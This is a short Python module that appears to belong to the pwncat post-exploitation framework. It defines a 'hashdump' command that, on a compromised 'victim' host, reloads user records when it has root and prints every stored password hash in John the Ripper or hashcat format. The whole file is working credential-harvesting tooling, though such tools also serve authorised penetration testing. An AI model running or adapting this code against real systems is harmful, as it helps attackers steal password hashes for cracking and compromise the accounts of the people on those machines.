#!/usr/bin/env python3
from pwncat.commands.base import CommandDefinition, parameter, Complete
import pwncat


class Command(CommandDefinition):
    """
    Display any known hashes for users on the remote system. By default
    the hashes are displayed in a format acceptable to John the Ripper
    ("username:hash"). This command can also display only a hash per-line
    which is compatible with the required hashcat format.
    """

    PROG = "hashdump"
    ARGS = {
        "--hashcat,-c": parameter(
            Complete.NONE, action="store_true", help="Display hashes in hashcat form"
        )
    }
    DEFAULTS = {}
    LOCAL = False

    def run(self, args):

        # Make sure we have the newest copy of the password hashes.
        if pwncat.victim.id["euid"]["id"] == 0:
            pwncat.victim.reload_users()

        for name, user in pwncat.victim.users.items():
            if user.hash is not None:
                if args.hashcat:
                    print(f"{user.hash}")
                else:
                    print(f"{user.name}:{user.hash}")
